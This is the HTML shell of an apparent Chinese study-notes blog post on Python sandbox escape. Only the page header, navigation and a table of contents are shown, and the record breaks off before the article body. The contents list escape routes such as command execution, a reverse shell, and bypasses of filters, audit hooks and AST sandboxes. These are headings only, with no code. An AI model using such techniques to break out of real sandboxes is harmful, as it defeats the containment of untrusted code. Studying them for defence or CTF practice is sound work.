<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/hah.jpg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/hah.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/hah.jpg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fupanc.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="沙箱是一种安全机制，用于在受限制的环境中运行未信任的程序或代码。它的主要目的是防止这些程序或代码影响宿主系统或者访问未授权的数据。">
<meta property="og:type" content="article">
<meta property="og:title" content="python沙箱逃逸">
<meta property="og:url" content="https://fupanc.github.io/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
<meta property="og:site_name" content="Fupanc">
<meta property="og:description" content="沙箱是一种安全机制，用于在受限制的环境中运行未信任的程序或代码。它的主要目的是防止这些程序或代码影响宿主系统或者访问未授权的数据。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://fupanc.github.io/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240529163826211.png">
<meta property="og:image" content="https://fupanc.github.io/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240529204041780.png">
<meta property="article:published_time" content="2024-06-02T08:35:06.867Z">
<meta property="article:modified_time" content="2024-06-02T09:26:37.302Z">
<meta property="article:author" content="Fupanc">
<meta property="article:tag" content="学习笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://fupanc.github.io/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240529163826211.png">


<link rel="canonical" href="https://fupanc.github.io/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://fupanc.github.io/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/","path":"2024/06/02/python沙箱逃逸/","title":"python沙箱逃逸"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>python沙箱逃逸 | Fupanc</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="Fupanc" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Fupanc</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">Fupanc's blog</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%B4%E6%98%8E"><span class="nav-number">1.</span> <span class="nav-text">基本说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%B2%99%E7%AE%B1"><span class="nav-number">2.</span> <span class="nav-text">常见沙箱</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exec-%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.</span> <span class="nav-text">exec 执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval%E6%89%A7%E8%A1%8C"><span class="nav-number">2.2.</span> <span class="nav-text">eval执行</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#eval%E4%B8%8Eexec-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">2.2.1.</span> <span class="nav-text">eval与exec 的区别</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#compile"><span class="nav-number">2.2.2.</span> <span class="nav-text">compile</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Eaudit-hook-%E7%9A%84%E6%B2%99%E7%AE%B1"><span class="nav-number">2.3.</span> <span class="nav-text">基于audit hook 的沙箱</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EAST%E7%9A%84%E6%B2%99%E7%AE%B1"><span class="nav-number">2.4.</span> <span class="nav-text">基于AST的沙箱</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%83%E9%80%B8%E7%9B%AE%E6%A0%87"><span class="nav-number">3.</span> <span class="nav-text">逃逸目标</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">3.0.1.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#commands%E6%A8%A1%E5%9D%97-%E4%BB%85%E9%99%902-x"><span class="nav-number">3.0.1.1.</span> <span class="nav-text">commands模块(仅限2.x)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#timeit%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.1.2.</span> <span class="nav-text">timeit模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exec%E5%87%BD%E6%95%B0"><span class="nav-number">3.0.1.3.</span> <span class="nav-text">exec函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#eval%E5%87%BD%E6%95%B0"><span class="nav-number">3.0.1.4.</span> <span class="nav-text">eval函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#platform%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.1.5.</span> <span class="nav-text">platform模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#os%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.1.6.</span> <span class="nav-text">os模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#subprocess%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.1.7.</span> <span class="nav-text">subprocess模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#pty%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.1.8.</span> <span class="nav-text">pty模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#importlib-%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.1.9.</span> <span class="nav-text">importlib 模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#sys%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.1.10.</span> <span class="nav-text">sys模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#builtins-%E5%88%A9%E7%94%A8"><span class="nav-number">3.0.1.11.</span> <span class="nav-text">__builtins__利用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#help%E5%87%BD%E6%95%B0"><span class="nav-number">3.0.1.12.</span> <span class="nav-text">help函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#breakpoint%E5%87%BD%E6%95%B0"><span class="nav-number">3.0.1.13.</span> <span class="nav-text">breakpoint函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ctypes"><span class="nav-number">3.0.1.14.</span> <span class="nav-text">ctypes</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#threading"><span class="nav-number">3.0.1.15.</span> <span class="nav-text">threading</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#multiprocessing"><span class="nav-number">3.0.1.16.</span> <span class="nav-text">multiprocessing</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#posixsubprocess"><span class="nav-number">3.0.1.17.</span> <span class="nav-text">_posixsubprocess</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.0.1.18.</span> <span class="nav-text">反弹shell</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">3.0.2.</span> <span class="nav-text">读写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#file-%E7%B1%BB"><span class="nav-number">3.0.2.1.</span> <span class="nav-text">file 类</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#open-%E5%87%BD%E6%95%B0"><span class="nav-number">3.0.2.2.</span> <span class="nav-text">open 函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#codecs-%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.2.3.</span> <span class="nav-text">codecs 模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#get-data-%E5%87%BD%E6%95%B0"><span class="nav-number">3.0.2.4.</span> <span class="nav-text">get_data 函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#linecache-%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.2.5.</span> <span class="nav-text">linecache 模块</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%BB%E7%9B%AE%E5%BD%95"><span class="nav-number">3.0.3.</span> <span class="nav-text">读目录</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#os%E6%A8%A1%E5%9D%97-1"><span class="nav-number">3.0.3.1.</span> <span class="nav-text">os模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#glob%E6%A8%A1%E5%9D%97"><span class="nav-number">3.0.3.2.</span> <span class="nav-text">glob模块</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="nav-number">3.0.4.</span> <span class="nav-text">获取环境信息</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%8E%AF%E5%A2%83%E7%9A%84%E5%B1%9E%E6%80%A7%E5%92%8C%E5%87%BD%E6%95%B0"><span class="nav-number">3.0.4.1.</span> <span class="nav-text">获取当前环境的属性和函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96python%E7%89%88%E6%9C%AC"><span class="nav-number">3.0.4.2.</span> <span class="nav-text">获取python版本</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96linux%E7%89%88%E6%9C%AC"><span class="nav-number">3.0.4.3.</span> <span class="nav-text">获取linux版本</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%B7%AF%E5%BE%84"><span class="nav-number">3.0.4.4.</span> <span class="nav-text">获取路径</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-number">3.0.5.</span> <span class="nav-text">获取全局变量</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#global%E5%87%BD%E6%95%B0"><span class="nav-number">3.0.5.1.</span> <span class="nav-text">global函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#help%E5%87%BD%E6%95%B0-1"><span class="nav-number">3.0.5.2.</span> <span class="nav-text">help函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#vars%E5%87%BD%E6%95%B0"><span class="nav-number">3.0.5.3.</span> <span class="nav-text">vars函数</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97%E6%88%96%E6%96%B9%E6%B3%95"><span class="nav-number">4.1.</span> <span class="nav-text">绕过删除模块或方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#reload-%E9%87%8D%E6%96%B0%E5%8A%A0%E8%BD%BD"><span class="nav-number">4.1.1.</span> <span class="nav-text">reload 重新加载</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%81%A2%E5%A4%8Dsys-modules"><span class="nav-number">4.1.2.</span> <span class="nav-text">恢复sys.modules</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E7%BB%A7%E6%89%BF%E9%93%BE%E8%8E%B7%E5%8F%96"><span class="nav-number">4.1.3.</span> <span class="nav-text">基于继承链获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8globals-%E8%8E%B7%E5%8F%96builtins%E6%96%B9%E6%B3%95"><span class="nav-number">4.1.4.</span> <span class="nav-text">使用globals()获取builtins方法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="nav-number">4.2.</span> <span class="nav-text">绕过基于字符串匹配的过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">4.2.1.</span> <span class="nav-text">过滤关键字</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="nav-number">4.2.1.1.</span> <span class="nav-text">字符串拼接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%80%86%E5%BA%8F"><span class="nav-number">4.2.1.2.</span> <span class="nav-text">逆序</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BC%96%E7%A0%81"><span class="nav-number">4.2.1.3.</span> <span class="nav-text">编码</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%B1%9E%E6%80%A7%E5%90%8D%E6%88%96%E8%80%85%E5%87%BD%E6%95%B0%E5%90%8D"><span class="nav-number">4.2.2.</span> <span class="nav-text">过滤了属性名或者函数名</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#getattr%E5%87%BD%E6%95%B0"><span class="nav-number">4.2.2.1.</span> <span class="nav-text">getattr函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#getattribute-%E5%87%BD%E6%95%B0"><span class="nav-number">4.2.2.2.</span> <span class="nav-text">__getattribute__ 函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#getattr-%E5%87%BD%E6%95%B0"><span class="nav-number">4.2.2.3.</span> <span class="nav-text">__getattr__函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E5%80%BC%E6%9B%BF%E6%8D%A2"><span class="nav-number">4.2.2.4.</span> <span class="nav-text">属性值替换</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4import"><span class="nav-number">4.2.2.5.</span> <span class="nav-text">过滤import</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="nav-number">4.2.2.6.</span> <span class="nav-text">过滤引号</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-number">4.2.2.7.</span> <span class="nav-text">过滤 +</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E6%95%B0%E5%AD%97"><span class="nav-number">4.2.2.8.</span> <span class="nav-text">过滤了数字</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#unicode%E7%BB%95%E8%BF%87"><span class="nav-number">4.2.2.9.</span> <span class="nav-text">unicode绕过</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-1"><span class="nav-number">4.2.2.10.</span> <span class="nav-text">过滤[]</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6"><span class="nav-number">4.3.</span> <span class="nav-text">绕过命名空间限制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E9%99%90%E5%88%B6"><span class="nav-number">4.3.1.</span> <span class="nav-text">部分限制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%8C%E5%85%A8%E9%99%90%E5%88%B6%EF%BC%88no-builtins%EF%BC%89"><span class="nav-number">4.3.2.</span> <span class="nav-text">完全限制（no builtins）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A4%9A%E8%A1%8C%E9%99%90%E5%88%B6"><span class="nav-number">4.4.</span> <span class="nav-text">绕过多行限制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#exec"><span class="nav-number">4.4.1.</span> <span class="nav-text">exec</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#compile-1"><span class="nav-number">4.4.2.</span> <span class="nav-text">compile</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B5%B7%E8%B1%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">4.4.3.</span> <span class="nav-text">海象表达式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-number">4.5.</span> <span class="nav-text">绕过长度限制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%93%E5%BC%80%E8%BE%93%E5%85%A5%E6%B5%81"><span class="nav-number">4.5.1.</span> <span class="nav-text">打开输入流</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#input-%E5%87%BD%E6%95%B0"><span class="nav-number">4.5.1.1.</span> <span class="nav-text">input()函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#breakpoint-%E5%87%BD%E6%95%B0"><span class="nav-number">4.5.1.2.</span> <span class="nav-text">breakpoint 函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#help-%E5%87%BD%E6%95%B0"><span class="nav-number">4.5.1.3.</span> <span class="nav-text">help 函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E4%B8%8E%E5%87%BD%E6%95%B0%E7%AF%A1%E6%94%B9"><span class="nav-number">4.6.</span> <span class="nav-text">变量覆盖与函数篡改</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-gc-%E8%8E%B7%E5%8F%96%E5%B7%B2%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97"><span class="nav-number">4.6.1.</span> <span class="nav-text">利用 gc 获取已删除模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8traceback-%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97"><span class="nav-number">4.6.2.</span> <span class="nav-text">利用traceback 获取模块</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-audit-hook"><span class="nav-number">4.7.</span> <span class="nav-text">绕过 audit hook</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#loader-load-module%E5%AF%BC%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="nav-number">4.7.0.1.</span> <span class="nav-text">__loader__.load_module导入模块</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#posixsubprocess-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">4.7.0.2.</span> <span class="nav-text">_posixsubprocess 执行命令</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AF%A1%E6%94%B9%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-number">4.7.0.3.</span> <span class="nav-text">篡改内置函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1"><span class="nav-number">4.8.</span> <span class="nav-text">绕过 AST 沙箱</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#without-call"><span class="nav-number">4.8.1.</span> <span class="nav-text">without call</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%A3%85%E9%A5%B0%E5%99%A8"><span class="nav-number">4.8.1.1.</span> <span class="nav-text">装饰器</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%A6%86%E7%9B%96"><span class="nav-number">4.8.1.2.</span> <span class="nav-text">函数覆盖</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-license%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">4.8.2.</span> <span class="nav-text">通过 license函数读取文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-ast-Attribute-%E8%8E%B7%E5%8F%96%E5%B1%9E%E6%80%A7"><span class="nav-number">4.8.3.</span> <span class="nav-text">绕过 ast.Attribute 获取属性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-ast-Assign-%E8%B5%8B%E5%80%BC%E5%8F%98%E9%87%8F"><span class="nav-number">4.8.4.</span> <span class="nav-text">绕过 ast.Assign 赋值变量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-ast-Constant-%E8%8E%B7%E5%8F%96%E6%95%B0%E5%AD%97%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">4.8.5.</span> <span class="nav-text">绕过 ast.Constant 获取数字、字符串</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-ast-Subscript-%E8%8E%B7%E5%8F%96%E5%88%97%E8%A1%A8-%E5%AD%97%E5%85%B8%E5%85%83%E7%B4%A0"><span class="nav-number">4.8.6.</span> <span class="nav-text">绕过 ast.Subscript 获取列表&#x2F;字典元素</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-ast-For-%E9%81%8D%E5%8E%86%E5%88%97%E8%A1%A8"><span class="nav-number">4.8.7.</span> <span class="nav-text">绕过 ast.For 遍历列表</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Fupanc"
      src="/images/index.jpg">
  <p class="site-author-name" itemprop="name">Fupanc</p>
  <div class="site-description" itemprop="description">志之难也，不在胜人，在于自胜</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/Fupanc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Fupanc" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:fupanc.vivo50@gmail.com" title="E-Mail → mailto:fupanc.vivo50@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://fupanc.github.io/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/index.jpg">
      <meta itemprop="name" content="Fupanc">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Fupanc">
      <meta itemprop="description" content="志之难也，不在胜人，在于自胜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="python沙箱逃逸 | Fupanc">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          python沙箱逃逸
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-06-02 16:35:06 / 修改时间：17:26:37" itemprop="dateCreated datePublished" datetime="2024-06-02T16:35:06+08:00">2024-06-02</time>
    </span>
